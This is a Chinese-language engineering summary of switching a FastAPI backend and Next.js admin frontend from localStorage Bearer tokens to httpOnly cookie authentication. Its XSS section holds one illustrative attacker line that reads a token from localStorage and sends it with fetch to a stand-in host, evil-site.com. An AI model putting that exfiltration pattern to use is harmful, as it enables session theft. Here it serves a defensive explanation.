# HttpOnly Cookie 认证修改总结

## 修改概述

将 FastAPI 后端从纯 Bearer Token 认证改为支持 httpOnly Cookie 认证，提高安全性。

## 修改文件清单

### 1. 后端修改

#### `app/routers/auth.py`
**修改内容：**
- 登录接口 (`/login`) 添加 Response 参数，设置 httpOnly cookie
- 添加登出接口 (`/logout`)，清除 cookie
- 根据环境变量动态设置 cookie 的 `secure` 标志

**关键代码：**
```python
@router.post("/login", response_model=Token)
async def login(response: Response, form_data: OAuth2PasswordRequestForm = Depends()):
    # ... 验证用户 ...
    is_secure = settings.app_env == "production"
    response.set_cookie(
        key="access_token",
        value=access_token,
        httponly=True,
        secure=is_secure,
        samesite="lax",
        max_age=settings.access_token_expire_minutes * 60,
        path="/"
    )
    return {"access_token": access_token, "token_type": "bearer"}
```

#### `app/security.py`
**修改内容：**
- 添加 `get_token_from_request()` 函数，支持从 cookie 和 Bearer token 获取 token
- 修改 `get_current_user()` 函数，支持两种认证方式

**关键代码：**
```python
async def get_token_from_request(
    request: Request,
    credentials: Optional[HTTPAuthorizationCredentials] = Depends(HTTPBearer(auto_error=False))
) -> str:
    # 1. 尝试从 Authorization Header 获取
    if credentials and credentials.credentials:
        return credentials.credentials
    # 2. 尝试从 cookie 获取
    return request.cookies.get("access_token")

async def get_current_user(
    request: Request,
    credentials: Optional[HTTPAuthorizationCredentials] = Depends(HTTPBearer(auto_error=False))
):
    token = await get_token_from_request(request, credentials)
    # 验证 token...
    return user
```

### 2. 前端修改

#### `apps/admin/src/app/[locale]/api-integration/page.tsx`
**修改内容：**
- 移除 localStorage 读写逻辑
- 移除 `isMounted` 状态
- 简化登录后的状态管理

**移除的代码：**
```typescript
// 移除
localStorage.setItem('fastapi_token', token)
localStorage.getItem('fastapi_token')
localStorage.removeItem('fastapi_token')
```

**保留的代码：**
```typescript
// API 调用仍然配置了 credentials: 'include'
fetch(url, {
  credentials: 'include', // 确保浏览器自动发送 cookie
  headers: {
    'Content-Type': 'application/json',
    // Authorization header 仍然可以用于兼容性
    ...(token && { 'Authorization': `Bearer ${token}` }),
  },
  ...options,
})
```

### 3. 新增文档

#### `COOKIE_AUTH_GUIDE.md`
- 详细的使用说明
- 实现细节
- 安全注意事项
- 故障排查指南

#### `COOKIE_AUTH_TEST.md`
- 快速测试步骤
- API 测试示例
- 性能测试方法
- 常见问题排查

## 认证流程变化

### 之前（Bearer Token）

```
用户登录
  ↓
前端收到 token
  ↓
保存到 localStorage
  ↓
后续请求手动添加 Authorization header
  ↓
后端验证 token
```

### 现在（httpOnly Cookie）

```
用户登录
  ↓
后端设置 httpOnly cookie
  ↓
浏览器自动保存 cookie（JavaScript 无法访问）
  ↓
后续请求浏览器自动发送 cookie
  ↓
后端从 cookie 读取并验证 token
```

## 安全性提升

### 1. XSS 防护

**之前：**
```javascript
// 攻击者可以窃取 token
const token = localStorage.getItem('fastapi_token')
fetch('https://evil-site.com/steal', { body: token })
```

**现在：**
```javascript
// 攻击者无法访问 httpOnly cookie
console.log(document.cookie) // access_token 不会显示
```

### 2. 自动认证

**之前：**
- 前端需要管理 token 状态
- 需要在每个请求中添加 Authorization header
- 刷新页面需要从 localStorage 读取

**现在：**
- 浏览器自动管理 cookie
- 自动发送 cookie，无需手动添加
- 刷新页面自动保持登录状态

### 3. CSRF 保护

通过 `SameSite: Lax` 设置，防止 CSRF 攻击：
- 允许同站请求
- 限制跨站 POST/PUT/DELETE 请求

## 兼容性

### 支持的认证方式

1. **httpOnly Cookie**（推荐，浏览器环境）
   - 自动发送
   - 安全性高
   - 用户体验好

2. **Bearer Token**（兼容，第三方应用）
   - 手动管理
   - 灵活性高
   - 适用于非浏览器环境

### 向后兼容

- 登录接口仍然返回 access_token
- API 支持 Authorization header 和 cookie 两种方式
- 现有的 Bearer token 认证继续有效

## 环境配置

### 开发环境（HTTP）

`.env` 配置：
```bash
APP_ENV=development
```

Cookie 设置：
```python
secure=False  # HTTP 允许发送
```

### 生产环境（HTTPS）

`.env` 配置：
```bash
APP_ENV=production
```

Cookie 设置：
```python
secure=True  # 仅 HTTPS 传输
```

## CORS 配置

确保允许凭据：

```python
# app/middleware.py
def setup_cors(app: FastAPI):
    app.add_middleware(
        CORSMiddleware,
        allow_origins=settings.allowed_origins,  # 必须明确指定域名
        allow_credentials=True,  # 关键：允许发送 cookie
        allow_methods=settings.allowed_methods,
        allow_headers=settings.allowed_headers,
    )
```

**重要：**
- 前端域名必须在 `allowed_origins` 列表中
- 不能使用 `allow_origins=["*"]` 与 `allow_credentials=True` 搭配

## 测试验证

### 功能测试清单

- [ ] 登录后正确设置 cookie
- [ ] 刷新页面保持登录状态
- [ ] API 请求自动发送 cookie
- [ ] 登出后清除 cookie
- [ ] Cookie 为 httpOnly（JavaScript 无法访问）
- [ ] 跨域请求正常工作
- [ ] Bearer token 方式仍然有效（兼容性）

### 安全测试清单

- [ ] XSS 攻击无法窃取 cookie
- [ ] CSRF 攻击被 SameSite 阻止
- [ ] 生产环境仅 HTTPS 传输
- [ ] Token 过期后自动失效
- [ ] 登出后 cookie 被清除

### 性能测试清单

- [ ] Cookie 认证性能与 Token 认证相当
- [ ] 并发请求正常工作
- [ ] Cookie 不影响请求速度

## 迁移步骤

### 现有项目迁移

1. **更新后端代码**
   ```bash
   # 拉取最新代码
   git pull
   ```

2. **更新依赖**
   ```bash
   cd fastapi-web
   pip install -r requirements.txt
   ```

3. **重启服务**
   ```bash
   python -m uvicorn app.main:app --reload
   ```

4. **前端更新**
   ```bash
   cd interview
   pnpm install
   pnpm dev --filter=@interview/admin
   ```

5. **测试验证**
   - 登录功能
   - API 调用
   - 刷新页面
   - 登出功能

### 新项目集成

1. **配置 CORS**
   ```python
   # app/config.py
   allowed_origins = [
       "http://your-frontend.com",
   ]
   allow_credentials = True
   ```

2. **前端配置**
   ```typescript
   // 确保使用 credentials: 'include'
   fetch(url, {
     credentials: 'include'
   })
   ```

3. **测试验证**
   - 参考测试文档进行完整测试

## 注意事项

### 开发环境

- HTTP 协议下 `secure=False`
- 确保域名在 `allowed_origins` 中
- 使用 `localhost` 而非 `127.0.0.1`（可选）

### 生产环境

- 必须使用 HTTPS
- 设置 `APP_ENV=production`
- 更新 `allowed_origins` 为生产域名
- 使用强密钥（`SECRET_KEY`）

### 安全建议

1. **定期轮换密钥**
   ```bash
   openssl rand -hex 32
   ```

2. **监控异常登录**
   - 记录登录日志
   - 监控异常 IP

3. **实现速率限制**
   - 已配置 Redis 速率限制
   - 根据实际需求调整

4. **定期审计**
   - 代码审计
   - 安全扫描

## 常见问题

### Q1: Cookie 不在浏览器中显示

**A:** 检查以下几点：
1. 响应头是否包含 `Set-Cookie`
2. CORS 配置是否正确
3. 浏览器是否阻止了 cookie
4. 查看浏览器控制台的错误信息

### Q2: 刷新页面后需要重新登录

**A:** 可能的原因：
1. Cookie 未正确设置
2. Cookie 的 `Path` 或 `Domain` 不正确
3. 浏览器阻止了 cookie
4. Cookie 已过期

### Q3: API 请求返回 401

**A:** 检查以下几点：
1. Cookie 是否已设置
2. Cookie 是否过期
3. `credentials: 'include'` 是否设置
4. CORS 配置是否正确

### Q4: 跨域请求失败

**A:** 检查 CORS 配置：
1. 前端域名是否在 `allowed_origins` 中
2. `allow_credentials=True` 是否设置
3. `SameSite` 策略是否正确

## 总结

通过这次修改，我们实现了：

1. ✅ **更高的安全性**：httpOnly cookie 防止 XSS 攻击
2. ✅ **更好的用户体验**：自动认证，无需手动管理 token
3. ✅ **向后兼容**：保持 Bearer token 认证方式
4. ✅ **灵活配置**：支持开发和生产环境
5. ✅ **完整文档**：详细的使用和测试指南

## 相关文档

- [Cookie 认证使用指南](./COOKIE_AUTH_GUIDE.md)
- [Cookie 认证测试指南](./COOKIE_AUTH_TEST.md)
- [FastAPI 安全文档](https://fastapi.tiangolo.com/tutorial/security/)
- [OWASP Cookie 安全](https://owasp.org/www-community/controls/SecureCookieAttribute)

## 支持

如有问题，请参考：
1. 测试指南进行排查
2. 使用指南了解实现细节
3. 查看 FastAPI 和浏览器开发者工具的日志
